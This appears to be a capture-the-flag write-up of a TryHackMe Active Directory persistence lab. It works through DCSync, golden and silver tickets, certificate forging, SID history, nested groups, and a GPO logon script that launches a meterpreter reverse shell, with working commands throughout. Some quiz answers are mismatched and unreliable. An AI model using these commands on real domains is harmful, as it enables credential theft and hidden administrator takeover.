# Persisting AD

## Persisting through Credentials

In order to complete this task we are going to to perform a DCSync Attack, where we take advantage of an account that has domain replication permissions to pretend to be a DC and harvest credentials from the real DC.

We can perform this attack using Mimikatz:

```
privilege::debug
lsadump::dcsync /domain:za.tryhackme.loc /all
```

Or else:

```
lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
```

**Question** What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?

lsadump::dcsync /domain:za.tryhackme.loc /user:test

**Question** What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?

\<NTLM Hash\>



## Persistence through Tickets

In this task we are going to establish persistence by generating a Golden and a Silver ticket. A golden ticket is a forged TGT, whereas a Silver ticket is a forged TGS.

For the Golden Ticket we will need:

- SID of the Domain
- Hash of the KRBTGT account

For the Silver Ticket we are going to need:

- Domain SID
- Target hostname and Machine account NTLM hash
- The service we are going to access using the silver ticket

### Golden Ticket

We will need the NTLM hash of the KRBTGT account, which you should now have due to the DC Sync performed in the previous task and the Domain SID. Using our low-privileged SSH terminal on THMWRK1 we can get this information with the command below:

```
Get-AdDomain
```

DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185

Now that we have both the krbtgt hash and the DomainSID we can continue. Using mimikatz let's generate us a Golden Ticket:

```
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
```

### Silver Ticket

Furthermore, make a note of the NTLM hash associated with the THMSERVER1 machine account since we will need this one for our silver ticket. You can find this information in the DC dump that you performed.

THMSERVER1 Machine Account NTLM Hash:

Object RDN           : THMSERVER1

** SAM ACCOUNT **

SAM Username         : THMSERVER1$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-6151 
Object Relative ID   : 6151

Credentials:
  Hash NTLM: 4c02d970f7b3da7f8ab6fa4dc77438f4

```
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
```

**Question** Which AD account's NTLM hash is used to sign Kerberos tickets?

Krbtgt

**Question** What is the name of a ticket that impersonates a legitimate TGT?

Golden Ticket

**Question** What is the name of a ticket that impersonates a legitimate TGS?

Silver Ticket

**Question** What is the default lifetime (in years) of a golden ticket generated by Mimikatz?

10

## Persistence through Certificates

We have seen that certificates can be used to exploit AD, however they can also be used for persistence. All we need is a valid certificate that can be used for Client Authentication. This will allow us to use the certificate to request a TGT. 

This way, we can continue requesting TGTs no matter how many rotations they do on the account we are attacking. The only way we can be kicked out is if they revoke the certificate we generated or if it expires. Meaning we probably have persistent access by default for roughly the next 5 years.

If we can steal the private key of the root CA's certificate to generate our own certificates whenever we feel like it. Since these certificates were never issued by the CA, the blue team has no ability to revoke them. This would be even worse for the blue team since it would mean a rotation of the CA, meaning all issued certificates would have to be revoked by the blue team to kick us out.

### Extracting the Private Key

```
crypto::certificates /systemstore:local_machine
```

We can see the CA certificate, but other certificates do not allow the user to export this certificate. We can use mimikatz to patch memory so that this operation is allowed.

```
privilege::debug
crypto::capi
crypto::cng
```

Now we can export the certificates to our directory in both pfx and der formats:

```
crypto::certificates /systemstore:local_machine /export
```

Great, now that we have exported the certificates, the one that is particularly interesting for our task is the CA PFX file. We can use a tool such as ForgeCert to forge a certificate using this PFX file so that we may generate TGTs using this certificate. Having both the private key and root CA certificate allows us to use this tool to forge a Client Authenticate certificate for any user we want.

```
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

Now that we have our certificate we can generate a TGT so that we can authenticate as the Administrator user. We are going to use Rubeus to generate this TGT and later one import it using mimikatz:

```
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:za_thmdc_admin.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
```

Load ticket using Mimikatz:

```
kerberos::ptt za_thmdc_admin.kirbi
```

Great! With our ticket in memory we can now access the domain controller's C Drive:

```
dir \\thmdc.za.tryhackme.loc\c$\
```

**Question** What key is used to sign certificates to prove their authenticity?

Private Key

**Question** What application can we use to forge a certificate if we have the CA certificate and private key?

ForgeCert.exe

**Question** What is the PowerShell command to restart the ntds service after we injected our SID history values?

kerberos::ptt ticket.kirbi



## Persistency through SID History

SIDs are used to track the security principal and the account's access when connecting to resources. Accounts have an attribute called SID history which we can abuse for persistency.

For example if we add the SID of the Domains Admins Group to the SID history of a non privileged user we can effectively gain Domain Admin access to the domain.

First we are going to verify that our user does not have any SIDs in its SID history attribute.

```
Get-ADUser <your ad username> -properties sidhistory,memberof
```

Now, we are going to get the SID of the Domain Admins Group:

```
Get-ADGroup "Domain Admins"
```

Now we just have to edit this attribute using our privileged account.

```
Stop-Service -Name ntds -force 

Add-ADDBSidHistory -SamAccountName sarah.hilton -SidHistory S-1-5-21-3885271727-2693558621-2658995185-512 -DatabasePath C:\Windows\NTDS\ntds.dit 

Start-Service -Name ntds
```

Check if your user has the new SID on its history attribute:

```
Get-ADUser <your ad username> -properties sidhistory,memberof
```

Finally, we can see that we have access as our non-privileged user by listing the C drive of the domain controller:

```
dir \\thmdc.za.tryhackme.loc\c$\
```

**Question** What AD object attribute is normally used to specify SIDs from the object's previous domain to allow seamless migration to a new domain?

SIDHistory

**Question** What is the database file on the domain controller that stores all AD information?

ntds.dit

**Question** What is the PowerShell command to restart the ntds service after we injected our SID history values?

Start-Service -Name ntds



## Persistency through Group Membership

The essence behind what is going to be performed in this task is that as an attacker, we can leverage the reduced visibility provided by group nesting to perform persistence. Instead of targeting the privileged groups that would provide us with access to the environment, we focus our attention on the subgroups instead. Rather than adding ourselves to a privileged group that would raise an alert, we add ourselves to a subgroup that is not being monitored.

We are going to add 5 groups making each new one we create the parent of the previous group. After doing this we are going to add the last group to the Domain Admins group and effectively gain Domain Admin access to the Domain.

```
#Group 1 and add our low privileged user to Group 1
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Nabecos Net Group 1" -SamAccountName "Nabecos_nestgroup1" -DisplayName "Nabecos Nest Group 1" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "Nabecos_nestgroup1" -Members "sarah.hilton"

#Group 2
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Nabecos Net Group 2" -SamAccountName "Nabecos_nestgroup2" -DisplayName "Nabecos Nest Group 2" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "Nabecos_nestgroup2" -Members "Nabecos_nestgroup1"

#Group 3
New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Nabecos Net Group 3" -SamAccountName "Nabecos_nestgroup3" -DisplayName "Nabecos Nest Group 3" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "Nabecos_nestgroup3" -Members "Nabecos_nestgroup2"

#Group 4
New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Nabecos Net Group 4" -SamAccountName "Nabecos_nestgroup4" -DisplayName "Nabecos Nest Group 4" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "Nabecos_nestgroup4" -Members "Nabecos_nestgroup3"

#Group 5
New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Nabecos Net Group 5" -SamAccountName "Nabecos_nestgroup5" -DisplayName "Nabecos Nest Group 5" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "Nabecos_nestgroup5" -Members "Nabecos_nestgroup4"

#Add Group 5 to Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "Nabecos_nestgroup5"
```

**Question** What is the term used to describe AD groups that are members of other AD groups?

Group Nesting

**Question** What is the command to add a new member, thmtest, to the AD group, thmgroup?

Add-ADGroupMember -Identity "thmgroup" -Members "thmtest"



## Persistency through ACLs



**Question** What AD group's ACLs are used as a template for the ACLs of all Protected Groups?

AdminSDHolder

**Question** What AD service updates the ACLs of all Protected Groups to match that of the template?

SDProp

**Question** What ACL permission allows the user to perform any action on the AD object?

Full Control



## Persistency through GPOs

The following are some common GPO persistence techniques:

- Restricted Group Membership - This could allow us administrative access to all hosts in the domain
- Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain. 

In this task we are going for the second hook. To do this, we will create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.

### Payloads Setup

We are first going to create a payload using msfvenom:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<attacker ip> lport=4445 -f exe > nabecos_shell.exe
```

Then create a batch script that will execute the payload we have created:

```
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\nabecos_shell.exe C:\tmp\nabecos_shell.exe && timeout /t 20 && C:\tmp\nabecos_shell.exe
```

Copy both scripts to the sysvol/scripts directory:

```
scp nabecos_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

scp nabecos_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Create Listener:

```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
```

### GPO Setup



### Execution



### Hiding 

Go back to your MMC windows, click on your policy and then click on Delegation:

We are going to remove the ability for administrators to edit or remove our policy

## Additional Persistence Techniques

Note that these are not the only persistence techniques available to us.

According to THM, the techniques below are also worth exploring:

- **[Skeleton keys](https://stealthbits.com/blog/unlocking-all-the-doors-to-active-directory-with-the-skeleton-key-attack/) -** Using Mimikatz, we can deploy a skeleton key. Mimikatz created a default password that will work for any account in the domain. Normal passwords will still work, making it hard to know that this attack has taken place. This default password can be used to impersonate any account in the domain.
- **[Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714) -** Domain controllers have an internal break glass administrator account called the DSRM account. This password is set when the server is promoted to a DC and is seldom changed. This password is used in cases of emergencies to recover the DC. An attacker can extract this password using Mimikatz and use this password to gain persistent administrative access to domain controllers in the environment.
- **[Malicious Security Support Provider (SSP)](https://adsecurity.org/?p=1760) -** Exploiting the SSP interface, it is possible to add new SSPs. We can add Mimikatz's mimilib as an SSP that would log all credentials of authentication attempts to a file. We can specify a network location for logging, which would allow mimilib to send us credentials as users authenticate to the compromised host, providing persistence.
- **[Computer Accounts](https://adsecurity.org/?p=2753)** **-** The passwords for machine accounts are normally rotated every 30 days. However, we can alter the password of a machine account which would stop the automatic rotation. Together with this, we can grant the machine account administrative access to other machines. This will allow us to use the computer account as a normal account, with the only sign of the persistence being the fact that the account has administrative rights over other hosts, which is often normal behaviour in AD, so that it may go undetected.
